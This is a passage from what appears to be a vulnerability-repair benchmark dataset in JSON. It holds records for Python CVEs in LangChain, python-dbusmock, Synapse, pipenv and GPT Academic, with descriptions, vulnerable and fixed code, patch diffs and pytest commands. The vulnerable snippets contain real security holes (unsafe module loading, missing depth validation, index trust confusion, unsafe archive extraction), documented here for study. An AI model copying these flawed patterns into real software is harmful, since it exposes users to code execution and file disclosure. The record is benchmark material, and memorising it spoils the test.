    "vul_patch": "--- a/libs/langchain/langchain/prompts/loading.py\n+++ b/libs/langchain/langchain/prompts/loading.py\n@@ -3,4 +3,15 @@\n     # Load the template from disk if necessary.\n     config = _load_template(\"template\", config)\n     config = _load_output_parser(config)\n+\n+    template_format = config.get(\"template_format\", \"f-string\")\n+    if template_format == \"jinja2\":\n+        # Disabled due to:\n+        # https://github.com/langchain-ai/langchain/issues/4394\n+        raise ValueError(\n+            f\"Loading templates with '{template_format}' format is no longer supported \"\n+            f\"since it can lead to arbitrary code execution. Please migrate to using \"\n+            f\"the 'f-string' template format, which does not suffer from this issue.\"\n+        )\n+\n     return PromptTemplate(**config)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-1326",
    "cve_description": "python-dbusmock before version 0.15.1 AddTemplate() D-Bus method call or DBusTestCase.spawn_server_template() method could be tricked into executing malicious code if an attacker supplies a .pyc file.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/martinpitt/python-dbusmock",
    "patch_url": [
      "https://github.com/martinpitt/python-dbusmock/commit/4e7d0df9093"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_68_1",
        "commit": "a4bd39f",
        "file_path": "dbusmock/mockobject.py",
        "start_line": 41,
        "end_line": 50,
        "snippet": "def load_module(name):\n    if os.path.exists(name) and os.path.splitext(name)[1] == '.py':\n        sys.path.insert(0, os.path.dirname(os.path.abspath(name)))\n        try:\n            m = os.path.splitext(os.path.basename(name))[0]\n            module = importlib.import_module(m)\n        finally:\n            sys.path.pop(0)\n\n        return module"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_65_1",
        "commit": "4e7d0df9093",
        "file_path": "dbusmock/mockobject.py",
        "start_line": 42,
        "end_line": 49,
        "snippet": "def load_module(name):\n    if os.path.exists(name) and os.path.splitext(name)[1] == '.py':\n        mod = imp.new_module(os.path.splitext(os.path.basename(name))[0])\n        with open(name) as f:\n            exec(f.read(), mod.__dict__, mod.__dict__)\n        return mod\n\n    return importlib.import_module('dbusmock.templates.' + name)"
      }
    ],
    "vul_patch": "--- a/dbusmock/mockobject.py\n+++ /dev/null\n@@ -1,10 +0,0 @@\n-def load_module(name):\n-    if os.path.exists(name) and os.path.splitext(name)[1] == '.py':\n-        sys.path.insert(0, os.path.dirname(os.path.abspath(name)))\n-        try:\n-            m = os.path.splitext(os.path.basename(name))[0]\n-            module = importlib.import_module(m)\n-        finally:\n-            sys.path.pop(0)\n-\n-        return module\n\n--- /dev/null\n+++ b/dbusmock/mockobject.py\n@@ -0,0 +1,8 @@\n+def load_module(name):\n+    if os.path.exists(name) and os.path.splitext(name)[1] == '.py':\n+        mod = imp.new_module(os.path.splitext(os.path.basename(name))[0])\n+        with open(name) as f:\n+            exec(f.read(), mod.__dict__, mod.__dict__)\n+        return mod\n+\n+    return importlib.import_module('dbusmock.templates.' + name)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2015-1326:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/python-dbusmock\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2015-1326/bin/python -m pytest tests/test_api.py::TestTemplates::test_local --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2015-1326:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/python-dbusmock\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2015-1326/bin/python -m pytest tests/test_api.py --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2018-10657",
    "cve_description": "Matrix Synapse before 0.28.1 is prone to a denial of service flaw where malicious events injected with depth = 2^63 - 1 render rooms unusable, related to federation/federation_base.py and handlers/message.py, as exploited in the wild in April 2018.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/matrix-org/synapse",
    "patch_url": [
      "https://github.com/matrix-org/synapse/commit/33f469ba19586bbafa0cf2c7d7c35463bdab87eb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_254_1",
        "commit": "28dd536",
        "file_path": "synapse/federation/federation_base.py",
        "start_line": 182,
        "end_line": 204,
        "snippet": "def event_from_pdu_json(pdu_json, outlier=False):\n    \"\"\"Construct a FrozenEvent from an event json received over federation\n\n    Args:\n        pdu_json (object): pdu as received over federation\n        outlier (bool): True to mark this event as an outlier\n\n    Returns:\n        FrozenEvent\n\n    Raises:\n        SynapseError: if the pdu is missing required fields\n    \"\"\"\n    # we could probably enforce a bunch of other fields here (room_id, sender,\n    # origin, etc etc)\n    assert_params_in_request(pdu_json, ('event_id', 'type'))\n    event = FrozenEvent(\n        pdu_json\n    )\n\n    event.internal_metadata.outlier = outlier\n\n    return event"
      },
      {
        "id": "vul_py_254_2",
        "commit": "28dd536",
        "file_path": "synapse/handlers/message.py",
        "start_line": 596,
        "end_line": 663,
        "snippet": "    def create_new_client_event(self, builder, requester=None,\n                                prev_events_and_hashes=None):\n        \"\"\"Create a new event for a local client\n\n        Args:\n            builder (EventBuilder):\n\n            requester (synapse.types.Requester|None):\n\n            prev_events_and_hashes (list[(str, dict[str, str], int)]|None):\n                the forward extremities to use as the prev_events for the\n                new event. For each event, a tuple of (event_id, hashes, depth)\n                where *hashes* is a map from algorithm to hash.\n\n                If None, they will be requested from the database.\n\n        Returns:\n            Deferred[(synapse.events.EventBase, synapse.events.snapshot.EventContext)]\n        \"\"\"\n\n        if prev_events_and_hashes is not None:\n            assert len(prev_events_and_hashes) <= 10, \\\n                \"Attempting to create an event with %i prev_events\" % (\n                    len(prev_events_and_hashes),\n            )\n        else:\n            prev_events_and_hashes = \\\n                yield self.store.get_prev_events_for_room(builder.room_id)\n\n        if prev_events_and_hashes:\n            depth = max([d for _, _, d in prev_events_and_hashes]) + 1\n        else:\n            depth = 1\n\n        prev_events = [\n            (event_id, prev_hashes)\n            for event_id, prev_hashes, _ in prev_events_and_hashes\n        ]\n\n        builder.prev_events = prev_events\n        builder.depth = depth\n\n        context = yield self.state.compute_event_context(builder)\n        if requester:\n            context.app_service = requester.app_service\n\n        if builder.is_state():\n            builder.prev_state = yield self.store.add_event_hashes(\n                context.prev_state_events\n            )\n\n        yield self.auth.add_auth_events(builder, context)\n\n        signing_key = self.hs.config.signing_key[0]\n        add_hashes_and_signatures(\n            builder, self.server_name, signing_key\n        )\n\n        event = builder.build()\n\n        logger.debug(\n            \"Created event %s with state: %s\",\n            event.event_id, context.prev_state_ids,\n        )\n\n        defer.returnValue(\n            (event, context,)\n        )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_254_1",
        "commit": "33f469b",
        "file_path": "synapse/federation/federation_base.py",
        "start_line": 185,
        "end_line": 219,
        "snippet": "def event_from_pdu_json(pdu_json, outlier=False):\n    \"\"\"Construct a FrozenEvent from an event json received over federation\n\n    Args:\n        pdu_json (object): pdu as received over federation\n        outlier (bool): True to mark this event as an outlier\n\n    Returns:\n        FrozenEvent\n\n    Raises:\n        SynapseError: if the pdu is missing required fields or is otherwise\n            not a valid matrix event\n    \"\"\"\n    # we could probably enforce a bunch of other fields here (room_id, sender,\n    # origin, etc etc)\n    assert_params_in_request(pdu_json, ('event_id', 'type', 'depth'))\n\n    depth = pdu_json['depth']\n    if not isinstance(depth, six.integer_types):\n        raise SynapseError(400, \"Depth %r not an intger\" % (depth, ),\n                           Codes.BAD_JSON)\n\n    if depth < 0:\n        raise SynapseError(400, \"Depth too small\", Codes.BAD_JSON)\n    elif depth > MAX_DEPTH:\n        raise SynapseError(400, \"Depth too large\", Codes.BAD_JSON)\n\n    event = FrozenEvent(\n        pdu_json\n    )\n\n    event.internal_metadata.outlier = outlier\n\n    return event"
      },
      {
        "id": "fix_py_254_2",
        "commit": "33f469b",
        "file_path": "synapse/handlers/message.py",
        "start_line": 596,
        "end_line": 667,
        "snippet": "    def create_new_client_event(self, builder, requester=None,\n                                prev_events_and_hashes=None):\n        \"\"\"Create a new event for a local client\n\n        Args:\n            builder (EventBuilder):\n\n            requester (synapse.types.Requester|None):\n\n            prev_events_and_hashes (list[(str, dict[str, str], int)]|None):\n                the forward extremities to use as the prev_events for the\n                new event. For each event, a tuple of (event_id, hashes, depth)\n                where *hashes* is a map from algorithm to hash.\n\n                If None, they will be requested from the database.\n\n        Returns:\n            Deferred[(synapse.events.EventBase, synapse.events.snapshot.EventContext)]\n        \"\"\"\n\n        if prev_events_and_hashes is not None:\n            assert len(prev_events_and_hashes) <= 10, \\\n                \"Attempting to create an event with %i prev_events\" % (\n                    len(prev_events_and_hashes),\n            )\n        else:\n            prev_events_and_hashes = \\\n                yield self.store.get_prev_events_for_room(builder.room_id)\n\n        if prev_events_and_hashes:\n            depth = max([d for _, _, d in prev_events_and_hashes]) + 1\n            # we cap depth of generated events, to ensure that they are not\n            # rejected by other servers (and so that they can be persisted in\n            # the db)\n            depth = min(depth, MAX_DEPTH)\n        else:\n            depth = 1\n\n        prev_events = [\n            (event_id, prev_hashes)\n            for event_id, prev_hashes, _ in prev_events_and_hashes\n        ]\n\n        builder.prev_events = prev_events\n        builder.depth = depth\n\n        context = yield self.state.compute_event_context(builder)\n        if requester:\n            context.app_service = requester.app_service\n\n        if builder.is_state():\n            builder.prev_state = yield self.store.add_event_hashes(\n                context.prev_state_events\n            )\n\n        yield self.auth.add_auth_events(builder, context)\n\n        signing_key = self.hs.config.signing_key[0]\n        add_hashes_and_signatures(\n            builder, self.server_name, signing_key\n        )\n\n        event = builder.build()\n\n        logger.debug(\n            \"Created event %s with state: %s\",\n            event.event_id, context.prev_state_ids,\n        )\n\n        defer.returnValue(\n            (event, context,)\n        )"
      }
    ],
    "vul_patch": "--- a/synapse/federation/federation_base.py\n+++ b/synapse/federation/federation_base.py\n@@ -9,11 +9,23 @@\n         FrozenEvent\n \n     Raises:\n-        SynapseError: if the pdu is missing required fields\n+        SynapseError: if the pdu is missing required fields or is otherwise\n+            not a valid matrix event\n     \"\"\"\n     # we could probably enforce a bunch of other fields here (room_id, sender,\n     # origin, etc etc)\n-    assert_params_in_request(pdu_json, ('event_id', 'type'))\n+    assert_params_in_request(pdu_json, ('event_id', 'type', 'depth'))\n+\n+    depth = pdu_json['depth']\n+    if not isinstance(depth, six.integer_types):\n+        raise SynapseError(400, \"Depth %r not an intger\" % (depth, ),\n+                           Codes.BAD_JSON)\n+\n+    if depth < 0:\n+        raise SynapseError(400, \"Depth too small\", Codes.BAD_JSON)\n+    elif depth > MAX_DEPTH:\n+        raise SynapseError(400, \"Depth too large\", Codes.BAD_JSON)\n+\n     event = FrozenEvent(\n         pdu_json\n     )\n\n--- a/synapse/handlers/message.py\n+++ b/synapse/handlers/message.py\n@@ -29,6 +29,10 @@\n \n         if prev_events_and_hashes:\n             depth = max([d for _, _, d in prev_events_and_hashes]) + 1\n+            # we cap depth of generated events, to ensure that they are not\n+            # rejected by other servers (and so that they can be persisted in\n+            # the db)\n+            depth = min(depth, MAX_DEPTH)\n         else:\n             depth = 1\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-21668",
    "cve_description": "pipenv is a Python development workflow tool. Starting with version 2018.10.9 and prior to version 2022.1.8, a flaw in pipenv's parsing of requirements files allows an attacker to insert a specially crafted string inside a comment anywhere within a requirements.txt file, which will cause victims who use pipenv to install the requirements file to download dependencies from a package index server controlled by the attacker. By embedding malicious code in packages served from their malicious index server, the attacker can trigger arbitrary remote code execution (RCE) on the victims' systems. If an attacker is able to hide a malicious `--index-url` option in a requirements file that a victim installs with pipenv, the attacker can embed arbitrary malicious code in packages served from their malicious index server that will be executed on the victim's host during installation (remote code execution/RCE). When pip installs from a source distribution, any code in the setup.py is executed by the install process. This issue is patched in version 2022.1.8. The GitHub Security Advisory contains more information about this vulnerability.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pypa/pipenv",
    "patch_url": [
      "https://github.com/pypa/pipenv/commit/439782a8ae36c4762c88e43d5f0d8e563371b46f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_411_1",
        "commit": "9cb42e1acb0c36d706cccfaa01e296fcebc8a8b0",
        "file_path": "pipenv/core.py",
        "start_line": 147,
        "end_line": 190,
        "snippet": "def import_requirements(project, r=None, dev=False):\n    from pipenv.patched.notpip._vendor import requests as pip_requests\n    from pipenv.patched.notpip._internal.req.constructors import install_req_from_parsed_requirement\n    from pipenv.vendor.pip_shims.shims import parse_requirements\n\n    # Parse requirements.txt file with Pip's parser.\n    # Pip requires a `PipSession` which is a subclass of requests.Session.\n    # Since we're not making any network calls, it's initialized to nothing.\n    if r:\n        assert os.path.isfile(r)\n    # Default path, if none is provided.\n    if r is None:\n        r = project.requirements_location\n    with open(r) as f:\n        contents = f.read()\n    indexes = []\n    trusted_hosts = []\n    # Find and add extra indexes.\n    for line in contents.split(\"\\n\"):\n        index, extra_index, trusted_host, _ = parse_indexes(line.strip(), strict=True)\n        if index:\n            indexes = [index]\n        if extra_index:\n            indexes.append(extra_index)\n        if trusted_host:\n            trusted_hosts.append(trusted_host)\n    indexes = sorted(set(indexes))\n    trusted_hosts = sorted(set(trusted_hosts))\n    reqs = [install_req_from_parsed_requirement(f) for f in parse_requirements(r, session=pip_requests)]\n    for package in reqs:\n        if package.name not in BAD_PACKAGES:\n            if package.link is not None:\n                package_string = (\n                    f\"-e {package.link}\"\n                    if package.editable\n                    else str(package.link)\n                )\n                project.add_package_to_pipfile(package_string, dev=dev)\n            else:\n                project.add_package_to_pipfile(str(package.req), dev=dev)\n    for index in indexes:\n        trusted = index in trusted_hosts\n        project.add_index_to_pipfile(index, verify_ssl=trusted)\n    project.recase_pipfile()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_411_1",
        "commit": "439782a8ae36c4762c88e43d5f0d8e563371b46f",
        "file_path": "pipenv/core.py",
        "start_line": 147,
        "end_line": 195,
        "snippet": "def import_requirements(project, r=None, dev=False):\n    from pipenv.patched.notpip._vendor import requests as pip_requests\n    from pipenv.patched.notpip._internal.req.constructors import install_req_from_parsed_requirement\n    from pipenv.vendor.pip_shims.shims import parse_requirements\n\n    # Parse requirements.txt file with Pip's parser.\n    # Pip requires a `PipSession` which is a subclass of requests.Session.\n    # Since we're not making any network calls, it's initialized to nothing.\n    if r:\n        assert os.path.isfile(r)\n    # Default path, if none is provided.\n    if r is None:\n        r = project.requirements_location\n    with open(r) as f:\n        contents = f.read()\n    indexes = []\n    trusted_hosts = []\n    # Find and add extra indexes.\n    for line in contents.split(\"\\n\"):\n        index, extra_index, trusted_host, _ = parse_indexes(line.strip(), strict=True)\n        if index:\n            indexes = [index]\n        if extra_index:\n            indexes.append(extra_index)\n        if trusted_host:\n            trusted_hosts.append(get_host_and_port(trusted_host))\n    indexes = sorted(set(indexes))\n    trusted_hosts = sorted(set(trusted_hosts))\n    reqs = [install_req_from_parsed_requirement(f) for f in parse_requirements(r, session=pip_requests)]\n    for package in reqs:\n        if package.name not in BAD_PACKAGES:\n            if package.link is not None:\n                package_string = (\n                    f\"-e {package.link}\"\n                    if package.editable\n                    else str(package.link)\n                )\n                project.add_package_to_pipfile(package_string, dev=dev)\n            else:\n                project.add_package_to_pipfile(str(package.req), dev=dev)\n    for index in indexes:\n        # don't require HTTPS for trusted hosts (see: https://pip.pypa.io/en/stable/cli/pip/#cmdoption-trusted-host)\n        host_and_port = get_host_and_port(index)\n        require_valid_https = not any((v in trusted_hosts for v in (\n            host_and_port,\n            host_and_port.partition(':')[0],  # also check if hostname without port is in trusted_hosts\n        )))\n        project.add_index_to_pipfile(index, verify_ssl=require_valid_https)\n    project.recase_pipfile()"
      },
      {
        "id": "fix_py_411_2",
        "commit": "439782a8ae36c4762c88e43d5f0d8e563371b46f",
        "file_path": "pipenv/utils.py",
        "start_line": 1646,
        "end_line": 1667,
        "snippet": "def get_host_and_port(url):\n    \"\"\"Get the host, or the host:port pair if port is explicitly included, for the given URL.\n\n    Examples:\n    >>> get_host_and_port('example.com')\n    'example.com'\n    >>> get_host_and_port('example.com:443')\n    'example.com:443'\n    >>> get_host_and_port('http://example.com')\n    'example.com'\n    >>> get_host_and_port('https://example.com/')\n    'example.com'\n    >>> get_host_and_port('https://example.com:8081')\n    'example.com:8081'\n    >>> get_host_and_port('ssh://example.com')\n    'example.com'\n\n    :param url: the URL string to parse\n    :return: a string with the host:port pair if the URL includes port number explicitly; otherwise, returns host only\n    \"\"\"\n    url = urllib3_util.parse_url(url)\n    return '{}:{}'.format(url.host, url.port) if url.port else url.host"
      }
    ],
    "vul_patch": "--- a/pipenv/core.py\n+++ b/pipenv/core.py\n@@ -23,7 +23,7 @@\n         if extra_index:\n             indexes.append(extra_index)\n         if trusted_host:\n-            trusted_hosts.append(trusted_host)\n+            trusted_hosts.append(get_host_and_port(trusted_host))\n     indexes = sorted(set(indexes))\n     trusted_hosts = sorted(set(trusted_hosts))\n     reqs = [install_req_from_parsed_requirement(f) for f in parse_requirements(r, session=pip_requests)]\n@@ -39,6 +39,11 @@\n             else:\n                 project.add_package_to_pipfile(str(package.req), dev=dev)\n     for index in indexes:\n-        trusted = index in trusted_hosts\n-        project.add_index_to_pipfile(index, verify_ssl=trusted)\n+        # don't require HTTPS for trusted hosts (see: https://pip.pypa.io/en/stable/cli/pip/#cmdoption-trusted-host)\n+        host_and_port = get_host_and_port(index)\n+        require_valid_https = not any((v in trusted_hosts for v in (\n+            host_and_port,\n+            host_and_port.partition(':')[0],  # also check if hostname without port is in trusted_hosts\n+        )))\n+        project.add_index_to_pipfile(index, verify_ssl=require_valid_https)\n     project.recase_pipfile()\n\n--- /dev/null\n+++ b/pipenv/core.py\n@@ -0,0 +1,22 @@\n+def get_host_and_port(url):\n+    \"\"\"Get the host, or the host:port pair if port is explicitly included, for the given URL.\n+\n+    Examples:\n+    >>> get_host_and_port('example.com')\n+    'example.com'\n+    >>> get_host_and_port('example.com:443')\n+    'example.com:443'\n+    >>> get_host_and_port('http://example.com')\n+    'example.com'\n+    >>> get_host_and_port('https://example.com/')\n+    'example.com'\n+    >>> get_host_and_port('https://example.com:8081')\n+    'example.com:8081'\n+    >>> get_host_and_port('ssh://example.com')\n+    'example.com'\n+\n+    :param url: the URL string to parse\n+    :return: a string with the host:port pair if the URL includes port number explicitly; otherwise, returns host only\n+    \"\"\"\n+    url = urllib3_util.parse_url(url)\n+    return '{}:{}'.format(url.host, url.port) if url.port else url.host\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-25185",
    "cve_description": "GPT Academic provides interactive interfaces for large language models. In 3.91 and earlier, GPT Academic does not properly account for soft links. An attacker can create a malicious file as a soft link pointing to a target file, then package this soft link file into a tar.gz file and upload it. Subsequently, when accessing the decompressed file from the server, the soft link will point to the target file on the victim server. The vulnerability allows attackers to read all files on the server.",
    "cwe_info": {
      "CWE-59": {
        "name": "Improper Link Resolution Before File Access ('Link Following')",
        "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
      }
    },
    "repo": "https://github.com/binary-husky/gpt_academic",
    "patch_url": [
      "https://github.com/binary-husky/gpt_academic/commit/5dffe8627f681d7006cebcba27def038bb691949"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_402_1",
        "commit": "2aefef26db62efd0b684f3c3f35c77432e54afff",
        "file_path": "shared_utils/handle_upload.py",
        "start_line": 91,
        "end_line": 157,
        "snippet": "def extract_archive(file_path, dest_dir):\n    import zipfile\n    import tarfile\n    import os\n\n    # Get the file extension of the input file\n    file_extension = os.path.splitext(file_path)[1]\n\n    # Extract the archive based on its extension\n    if file_extension == \".zip\":\n        with zipfile.ZipFile(file_path, \"r\") as zipobj:\n            zipobj._extract_member = lambda a,b,c: zip_extract_member_new(zipobj, a,b,c)    # \\u4fee\\u590d\\u4e2d\\u6587\\u4e71\\u7801\\u7684\\u95ee\\u9898\n            zipobj.extractall(path=dest_dir)\n            logger.info(\"Successfully extracted zip archive to {}\".format(dest_dir))\n\n    elif file_extension in [\".tar\", \".gz\", \".bz2\"]:\n        try:\n            with tarfile.open(file_path, \"r:*\") as tarobj:\n                # \\u6e05\\u7406\\u63d0\\u53d6\\u8def\\u5f84\\uff0c\\u79fb\\u9664\\u4efb\\u4f55\\u4e0d\\u5b89\\u5168\\u7684\\u5143\\u7d20\n                for member in tarobj.getmembers():\n                    member_path = os.path.normpath(member.name)\n                    full_path = os.path.join(dest_dir, member_path)\n                    full_path = os.path.abspath(full_path)\n                    if member.islnk() or member.issym():\n                        raise Exception(f\"Attempted Symlink in {member.name}\")\n                    if not full_path.startswith(os.path.abspath(dest_dir) + os.sep):\n                        raise Exception(f\"Attempted Path Traversal in {member.name}\")\n\n                tarobj.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted tar archive to {}\".format(dest_dir))\n        except tarfile.ReadError as e:\n            if file_extension == \".gz\":\n                # \\u4e00\\u4e9b\\u7279\\u522b\\u5947\\u8469\\u7684\\u9879\\u76ee\\uff0c\\u662f\\u4e00\\u4e2agz\\u6587\\u4ef6\\uff0c\\u91cc\\u9762\\u4e0d\\u662ftar\\uff0c\\u53ea\\u6709\\u4e00\\u4e2atex\\u6587\\u4ef6\n                import gzip\n                with gzip.open(file_path, 'rb') as f_in:\n                    with open(os.path.join(dest_dir, 'main.tex'), 'wb') as f_out:\n                        f_out.write(f_in.read())\n            else:\n                raise e\n\n    # \\u7b2c\\u4e09\\u65b9\\u5e93\\uff0c\\u9700\\u8981\\u9884\\u5148pip install rarfile\n    # \\u6b64\\u5916\\uff0cWindows\\u4e0a\\u8fd8\\u9700\\u8981\\u5b89\\u88c5winrar\\u8f6f\\u4ef6\\uff0c\\u914d\\u7f6e\\u5176Path\\u73af\\u5883\\u53d8\\u91cf\\uff0c\\u5982\"C:\\Program Files\\WinRAR\"\\u624d\\u53ef\\u4ee5\n    elif file_extension == \".rar\":\n        try:\n            import rarfile\n\n            with rarfile.RarFile(file_path) as rf:\n                rf.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted rar archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"Rar format requires additional dependencies to install\")\n            return \"\\n\\n\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install rarfile\\u6765\\u89e3\\u538brar\\u6587\\u4ef6\\u3002\\u5efa\\u8bae\\uff1a\\u4f7f\\u7528zip\\u538b\\u7f29\\u683c\\u5f0f\\u3002\"\n\n    # \\u7b2c\\u4e09\\u65b9\\u5e93\\uff0c\\u9700\\u8981\\u9884\\u5148pip install py7zr\n    elif file_extension == \".7z\":\n        try:\n            import py7zr\n\n            with py7zr.SevenZipFile(file_path, mode=\"r\") as f:\n                f.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted 7z archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"7z format requires additional dependencies to install\")\n            return \"\\n\\n\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install py7zr\\u6765\\u89e3\\u538b7z\\u6587\\u4ef6\"\n    else:\n        return \"\"\n    return \"\""
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_402_1",
        "commit": "5dffe8627f681d7006cebcba27def038bb691949",
        "file_path": "shared_utils/handle_upload.py",
        "start_line": 117,
        "end_line": 180,
        "snippet": "def extract_archive(file_path, dest_dir):\n    import zipfile\n    import tarfile\n    import os\n\n    # Get the file extension of the input file\n    file_extension = os.path.splitext(file_path)[1]\n\n    # Extract the archive based on its extension\n    if file_extension == \".zip\":\n        with zipfile.ZipFile(file_path, \"r\") as zipobj:\n            zipobj._extract_member = lambda a,b,c: zip_extract_member_new(zipobj, a,b,c)    # \\u4fee\\u590d\\u4e2d\\u6587\\u4e71\\u7801\\u7684\\u95ee\\u9898\n            zipobj.extractall(path=dest_dir)\n            logger.info(\"Successfully extracted zip archive to {}\".format(dest_dir))\n\n    elif file_extension in [\".tar\", \".gz\", \".bz2\"]:\n        try:\n            with tarfile.open(file_path, \"r:*\") as tarobj:\n                # \\u6e05\\u7406\\u63d0\\u53d6\\u8def\\u5f84\\uff0c\\u79fb\\u9664\\u4efb\\u4f55\\u4e0d\\u5b89\\u5168\\u7684\\u5143\\u7d20\n                for member in tarobj.getmembers():\n                    member_path = os.path.normpath(member.name)\n                    full_path = os.path.join(dest_dir, member_path)\n                    full_path = os.path.abspath(full_path)\n                    if member.islnk() or member.issym():\n                        raise Exception(f\"Attempted Symlink in {member.name}\")\n                    if not full_path.startswith(os.path.abspath(dest_dir) + os.sep):\n                        raise Exception(f\"Attempted Path Traversal in {member.name}\")\n\n                tarobj.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted tar archive to {}\".format(dest_dir))\n        except tarfile.ReadError as e:\n            if file_extension == \".gz\":\n                # \\u4e00\\u4e9b\\u7279\\u522b\\u5947\\u8469\\u7684\\u9879\\u76ee\\uff0c\\u662f\\u4e00\\u4e2agz\\u6587\\u4ef6\\uff0c\\u91cc\\u9762\\u4e0d\\u662ftar\\uff0c\\u53ea\\u6709\\u4e00\\u4e2atex\\u6587\\u4ef6\n                import gzip\n                with gzip.open(file_path, 'rb') as f_in:\n                    with open(os.path.join(dest_dir, 'main.tex'), 'wb') as f_out:\n                        f_out.write(f_in.read())\n            else:\n                raise e\n\n    # \\u7b2c\\u4e09\\u65b9\\u5e93\\uff0c\\u9700\\u8981\\u9884\\u5148pip install rarfile\n    # \\u6b64\\u5916\\uff0cWindows\\u4e0a\\u8fd8\\u9700\\u8981\\u5b89\\u88c5winrar\\u8f6f\\u4ef6\\uff0c\\u914d\\u7f6e\\u5176Path\\u73af\\u5883\\u53d8\\u91cf\\uff0c\\u5982\"C:\\Program Files\\WinRAR\"\\u624d\\u53ef\\u4ee5\n    elif file_extension == \".rar\":\n        try:\n            import rarfile  # \\u7528\\u6765\\u68c0\\u67e5rarfile\\u662f\\u5426\\u5b89\\u88c5\\uff0c\\u4e0d\\u8981\\u5220\\u9664\n            safe_extract_rar(file_path, dest_dir)\n        except:\n            logger.info(\"Rar format requires additional dependencies to install\")\n            return \"<br/><br/>\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install rarfile\\u6765\\u89e3\\u538brar\\u6587\\u4ef6\\u3002\\u5efa\\u8bae\\uff1a\\u4f7f\\u7528zip\\u538b\\u7f29\\u683c\\u5f0f\\u3002\"\n\n    # \\u7b2c\\u4e09\\u65b9\\u5e93\\uff0c\\u9700\\u8981\\u9884\\u5148pip install py7zr\n    elif file_extension == \".7z\":\n        try:\n            import py7zr\n\n            with py7zr.SevenZipFile(file_path, mode=\"r\") as f:\n                f.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted 7z archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"7z format requires additional dependencies to install\")\n            return \"<br/><br/>\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install py7zr\\u6765\\u89e3\\u538b7z\\u6587\\u4ef6\"\n    else:\n        return \"\"\n    return \"\""
      }
    ],
    "vul_patch": "--- a/shared_utils/handle_upload.py\n+++ b/shared_utils/handle_upload.py\n@@ -42,14 +42,11 @@\n     # \\u6b64\\u5916\\uff0cWindows\\u4e0a\\u8fd8\\u9700\\u8981\\u5b89\\u88c5winrar\\u8f6f\\u4ef6\\uff0c\\u914d\\u7f6e\\u5176Path\\u73af\\u5883\\u53d8\\u91cf\\uff0c\\u5982\"C:\\Program Files\\WinRAR\"\\u624d\\u53ef\\u4ee5\n     elif file_extension == \".rar\":\n         try:\n-            import rarfile\n-\n-            with rarfile.RarFile(file_path) as rf:\n-                rf.extractall(path=dest_dir)\n-                logger.info(\"Successfully extracted rar archive to {}\".format(dest_dir))\n+            import rarfile  # \\u7528\\u6765\\u68c0\\u67e5rarfile\\u662f\\u5426\\u5b89\\u88c5\\uff0c\\u4e0d\\u8981\\u5220\\u9664\n+            safe_extract_rar(file_path, dest_dir)\n         except:\n             logger.info(\"Rar format requires additional dependencies to install\")\n-            return \"\\n\\n\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install rarfile\\u6765\\u89e3\\u538brar\\u6587\\u4ef6\\u3002\\u5efa\\u8bae\\uff1a\\u4f7f\\u7528zip\\u538b\\u7f29\\u683c\\u5f0f\\u3002\"\n+            return \"<br/><br/>\\u89e3\\u538b\\u5931\\u8d25! \\u9700\\u8981\\u5b89\\u88c5pip install 